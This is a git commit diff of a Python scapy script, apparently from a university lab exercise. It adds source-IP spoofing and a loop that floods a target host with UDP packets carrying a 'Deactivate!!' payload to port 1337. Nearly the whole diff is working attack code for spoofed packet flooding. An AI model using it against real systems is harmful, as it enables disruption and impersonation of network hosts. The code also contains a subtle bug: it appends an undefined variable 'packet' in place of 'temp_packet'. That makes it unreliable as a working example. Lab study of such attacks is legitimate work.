f9cf604c44bd0e7c8b7389fe3d888f28cb2be14a
Brandon <Brandon.Kamaka@afit.edu>
2019-01-11 11:39:14 -0500

    First draft -- low flood count

--- mxSentinel.py
+++ mxSentinel.py
@@ -2,20 +2,29 @@ from scapy.all import *
 from scapy.layers.inet import *
 
 
-target = 'matrix4.m4i.local'
-spoof = 'INSERT PARTNER IP HERE'
+target = "10.12.1.4"
+spoof = "10.204.0.7"
 payload = "Deactivate!!"
 packets = []
 
 def packet_craft(source_port):
-    pkt = IP(dst=target)/UDP(sport=source_port, dport=1337)/payload
+    pkt = IP(src=spoof, dst=target)/UDP(sport=source_port, dport=1337)/payload
     return pkt
 
-for i in range(1000):
+
+print "Beginning packet crafting ...\n"
+
+for i in range(10):
     source_port = random.randint(1024, 65535)
     temp_packet = packet_craft(source_port)
     packets.append(packet)
 
-print 'done'
+print "done crafting packets!\n"
+print "\nBeginning flood ...\n"
+
+for p in packets:
+    send(p)
+
+print "Done flooding!\n"
 
 
